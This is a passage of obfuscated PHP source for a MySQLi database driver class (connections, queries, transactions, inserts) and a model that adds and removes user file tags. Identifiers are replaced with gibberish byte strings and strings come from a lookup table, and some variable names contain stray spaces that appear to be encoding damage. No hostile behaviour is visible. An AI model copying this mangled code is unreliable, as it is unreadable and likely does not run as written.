(!isset($this->linkID[$ü¡»ÓÉ¸])) { if (empty($ü‘Ù³¾Š)) { $ü‘Ù³¾Š = $this->config; } $this->linkID[$ü¡»ÓÉ¸] = new mysqli($ü‘Ù³¾Š[$ÓäÇ·ÑÉ[973]], $ü‘Ù³¾Š[$ÓäÇ·ÑÉ[975]], $ü‘Ù³¾Š[$ÓäÇ·ÑÉ[976]], $ü‘Ù³¾Š[$ÓäÇ·ÑÉ[21]], $ü‘Ù³¾Š[$ÓäÇ·ÑÉ[974]] ? intval($ü‘Ù³¾Š[$ÓäÇ·ÑÉ[974]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ Šıß“Ç = $this->linkID[$ü¡»ÓÉ¸]->server_version; $this->linkID[$ü¡»ÓÉ¸]->query($ÓäÇ·ÑÉ[977] . think_config($ÓäÇ·ÑÉ[978]) . $ÓäÇ·ÑÉ[58]); if ($ Šıß“Ç > $ÓäÇ·ÑÉ[979]) { $this->linkID[$ü¡»ÓÉ¸]->query($ÓäÇ·ÑÉ[980]); } $this->connected = !0; if (1 != think_config($ÓäÇ·ÑÉ[22])) { unset($this->config); } } return $this->linkID[$ü¡»ÓÉ¸]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Óêëšíå) { $Øê„ÇÂ¥ =& $_SERVER[«òÑğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Óêëšíå; if ($this->queryID) { $this->free(); } think_action_status($Øê„ÇÂ¥[23], 1); think_status($Øê„ÇÂ¥[24]); $this->queryID = $this->_linkID->query($Óêëšíå); if ($this->_linkID->more_results()) { while (($İ±Íü¬ = $this->_linkID->next_result()) != NULL) { $İ±Íü¬->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($©äĞ¡“) { $À×›ıòÁ =& $_SERVER[«òÑğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©äĞ¡“; if ($this->queryID) { $this->free(); } think_action_status($À×›ıòÁ[25], 1); think_status($À×›ıòÁ[24]); $ÒØÌ®Å¹ = $this->_linkID->query($©äĞ¡“); $this->debug(); if (!1 === $ÒØÌ®Å¹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $õø¤øúÑ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$õø¤øúÑ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $áã¼ñ’¥ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$áã¼ñ’¥) { $this->error(); return !1; } } return !0; } private function getAll() { $òçËšúÒ = array(); if ($this->numRows > 0) { for ($«¡¨ˆ„¼ = 0; $«¡¨ˆ„¼ < $this->numRows; $«¡¨ˆ„¼++) { $òçËšúÒ[$«¡¨ˆ„¼] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $òçËšúÒ; } public function getFields($ƒÜÄÏ¾) { $óä€¢ =& $_SERVER[«òÑğ]; $æÍôÔò° = $this->query($óä€¢[984] . $this->parseKey($ƒÜÄÏ¾)); $œöñŠŠñ = array(); if ($æÍôÔò°) { foreach ($æÍôÔò° as $·ÒÏâÛ => $¶ø™¤â¼) { $œöñŠŠñ[$¶ø™¤â¼[$óä€¢[31]]] = array($óä€¢[32] => $¶ø™¤â¼[$óä€¢[31]], $óä€¢[33] => $¶ø™¤â¼[$óä€¢[34]], $óä€¢[35] => (bool) ($¶ø™¤â¼[$óä€¢[36]] === $óä€¢[12]), $óä€¢[37] => $¶ø™¤â¼[$óä€¢[38]], $óä€¢[39] => strtolower($¶ø™¤â¼[$óä€¢[40]]) == $óä€¢[41], $óä€¢[42] => strtolower($¶ø™¤â¼[$óä€¢[43]]) == $óä€¢[44]); } } return $œöñŠŠñ; } public function getTables($ÄŠ– Öù = '') { $§¹Ôì¾Ù =& $_SERVER[«òÑğ]; $§¤Áù“ú = !empty($ÄŠ– Öù) ? $§¹Ôì¾Ù[986] . $ÄŠ– Öù . $§¹Ôì¾Ù[987] : $§¹Ôì¾Ù[988]; $ªØ¾„ãÒ = $this->query($§¤Áù“ú); $°£šï‹É = array(); if ($ªØ¾„ãÒ) { foreach ($ªØ¾„ãÒ as $ÀŞÆó´– => $Î«÷ƒ×Ù) { $°£šï‹É[$ÀŞÆó´–] = current($Î«÷ƒ×Ù); } } return $°£šï‹É; } public function replace($¡èåèü, $¨”ÆŞ¤õ = array()) { $ÌŞ¼‘ß‹ =& $_SERVER[«òÑğ]; foreach ($¡èåèü as $Òşåùñ» => $á¤¾şØğ) { $ÙÕÍÜƒ = $this->parseValue($á¤¾şØğ); if (is_scalar($ÙÕÍÜƒ)) { $‚ˆÍêÂŒ[] = $ÙÕÍÜƒ; $ï…éÚšĞ[] = $this->parseKey($Òşåùñ»); } } $ÖÙòæ¶Ø = $ÌŞ¼‘ß‹[989] . $this->parseTable($¨”ÆŞ¤õ[$ÌŞ¼‘ß‹[359]]) . $ÌŞ¼‘ß‹[990] . implode($ÌŞ¼‘ß‹[50], $ï…éÚšĞ) . $ÌŞ¼‘ß‹[991] . implode($ÌŞ¼‘ß‹[50], $‚ˆÍêÂŒ) . $ÌŞ¼‘ß‹[992]; return $this->execute($ÖÙòæ¶Ø); } public function insertAll($èåü×°±, $¤İ´¥Š‘ = array(), $èÖòˆÒ = false) { $Š‡õÁÀù =& $_SERVER[«òÑğ]; if (!is_array($èåü×°±[0])) { return !1; } $óøœÜ¹º = array_keys($èåü×°±[0]); $–ÏÖ´ó‚ = array(); foreach ($èåü×°± as $üì‹¨Ãë) { $íåê¶¤í = array(); foreach ($üì‹¨Ãë as $‡¾Á‹ñ => $÷èº¶Èæ) { $÷èº¶Èæ = $this->parseValue($÷èº¶Èæ); if (is_scalar($÷èº¶Èæ)) { $íåê¶¤í[] = $÷èº¶Èæ; } } $–ÏÖ´ó‚[] = $Š‡õÁÀù[340] . implode($Š‡õÁÀù[50], $íåê¶¤í) . $Š‡õÁÀù[992]; } array_walk($óøœÜ¹º, array($this, $Š‡õÁÀù[993])); $Ø³ÕÚû™ = $èÖòˆÒ ? $Š‡õÁÀù[994] : $Š‡õÁÀù[995]; $‡÷Õ‰¯ù = $Ø³ÕÚû™ . $Š‡õÁÀù[996] . $this->parseTable($¤İ´¥Š‘[$Š‡õÁÀù[359]]) . $Š‡õÁÀù[990] . implode($Š‡õÁÀù[50], $óøœÜ¹º) . $Š‡õÁÀù[997] . implode($Š‡õÁÀù[50], $–ÏÖ´ó‚); return $this->execute($‡÷Õ‰¯ù); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¢ÂÛ¼öÀ =& $_SERVER[«òÑğ]; $this->error = $this->_linkID->errno . $¢ÂÛ¼öÀ[4] . $this->_linkID->error; if ($¢ÂÛ¼öÀ[12] != $this->queryStr) { $this->error .= LNG($¢ÂÛ¼öÀ[48]) . $this->queryStr; } think_trace($this->error, $¢ÂÛ¼öÀ[12], $¢ÂÛ¼öÀ[49]); return $this->error; } public function escapeString($‡÷›õìö) { if ($this->_linkID) { return $this->_linkID->real_escape_string($‡÷›õìö); } else { return addslashes($‡÷›õìö); } } public function parseKey(&$§¶ã¤…÷, $¾À‘´Ïù = true) { $Ô¶€‡§å =& $_SERVER[«òÑğ]; if ($¾À‘´Ïù) { $§¶ã¤…÷ = $this->parseKeyCheck($§¶ã¤…÷); } if ($§¶ã¤…÷ != $Ô¶€‡§å[223] && !preg_match($Ô¶€‡§å[998], $§¶ã¤…÷)) { $§¶ã¤…÷ = $Ô¶€‡§å[464] . trim($§¶ã¤…÷, $Ô¶€‡§å[464]) . $Ô¶€‡§å[464]; } return $§¶ã¤…÷; } } goto bÃï§ó‘¬×; FÂ’³×‹ˆâ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($÷í„×ƒİ) { $”³ÄËÚ =& $_SERVER[«òÑğ]; return array($”³ÄËÚ[2100] => array($”³ÄËÚ[2531] . USER_ID, $”³ÄËÚ[2101])); } protected function listData() { $£Î¢¦İ =& $_SERVER[«òÑğ]; $Èæ·ô­™ = array($£Î¢¦İ[1775] => USER_ID, $£Î¢¦İ[562] => array($£Î¢¦İ[2104], 0)); $€œğ×§÷ = $£Î¢¦İ[2532]; $ù•Ñ‘ĞÙ = $this->field($€œğ×§÷)->where($Èæ·ô­™)->order($£Î¢¦İ[2107])->select(); return $ù•Ñ‘ĞÙ ? $ù•Ñ‘ĞÙ : array(); } protected function addToTag($©ÈîÃÁÏ, $—¬¾†øé) { $Ù§ÊÜ€Â =& $_SERVER[«òÑğ]; if (!Model($Ù§ÊÜ€Â[2257])->listData($—¬¾†øé)) { return !1; } if (is_numeric($©ÈîÃÁÏ)) { $Û¢Ÿº¹ = Model($Ù§ÊÜ€Â[914])->pathInfo($©ÈîÃÁÏ); if (!$Û¢Ÿº¹) { return !1; } } else { $Û¢Ÿº¹ = IO::infoSimple($©ÈîÃÁÏ); if (!$Û¢Ÿº¹) { return !1; } $Áåæ”º = $Û¢Ÿº¹[$Ù§ÊÜ€Â[32]]; $‘µ¹µë½ = $Û¢Ÿº¹[$Ù§ÊÜ€Â[33]]; if (isset($Û¢Ÿº¹[$Ù§ÊÜ€Â[488]])) { $‘µ¹µë½ = $Û¢Ÿº¹[$Ù§ÊÜ€Â[488]] == $Ù§ÊÜ€Â[91] ? $Ù§ÊÜ€Â[78] : $Ù§ÊÜ€Â[233]; } } $Œ™ŞÁš = array($Ù§ÊÜ€Â[1775] => USER_ID, $Ù§ÊÜ€Â[562] => $—¬¾†øé, $Ù§ÊÜ€Â[498] => $©ÈîÃÁÏ, $Ù§ÊÜ€Â[499] => $‘µ¹µë½ ? $‘µ¹µë½ : $Ù§ÊÜ€Â[493], $Ù§ÊÜ€Â[497] => $Áåæ”º ? $Áåæ”º : $Ù§ÊÜ€Â[12], $Ù§ÊÜ€Â[1989] => 0); if ($this->where($Œ™ŞÁš)->find()) { return !1; } return $this->add($Œ™ŞÁš); } protected function removeFromTag($ú¶Ã¯·İ, $¨îÆÅÚİ) { $êû¦¿äò =& $_SERVER[«òÑğ]; if (!Model($êû¦¿äò[2257])->listData($¨îÆÅÚİ)) { return !1; } if (is_array($ú¶Ã¯·İ)) { $ú¶Ã¯·İ = array($êû¦¿äò[7], $ú¶Ã¯·İ); } $—ôà‚È‘ = array($êû¦¿äò[1775] => USER_ID, $êû¦¿äò[562] => $¨îÆÅÚİ, $êû¦¿äò[498] => $ú¶Ã¯·İ); return $this->where($—ôà‚È‘)->delete(); } protected function removeByTag($°–ıŞ‚) { $š¹Ú†Ìõ =& $_SERVER[«òÑğ]; if (!$°–ıŞ‚) { return !1; } $Ì¾„Ç¥ç = array($š¹Ú†Ìõ[1775] => USER_ID, $š¹Ú†Ìõ[562] => $°–ıŞ‚); return $this->where($Ì¾„Ç¥ç)->delete(); } protected function removeBySource($œ©²õ¨ˆ) { $®¨Ç‚ÉŸ =& $_SERVER[«òÑğ]; if (is_array($œ©²õ¨ˆ)) { $œ©²õ¨ˆ = array($®¨Ç‚ÉŸ[7], $œ©²õ¨ˆ); } $òòË×†ñ = array($®¨Ç‚ÉŸ[1775] => USER_ID, $®¨Ç‚ÉŸ[562] => array($®¨Ç‚ÉŸ[1101], 0), $®¨Ç‚ÉŸ[498] => $œ©²õ¨ˆ); return $this->where($òòË×†ñ)->delete(); } }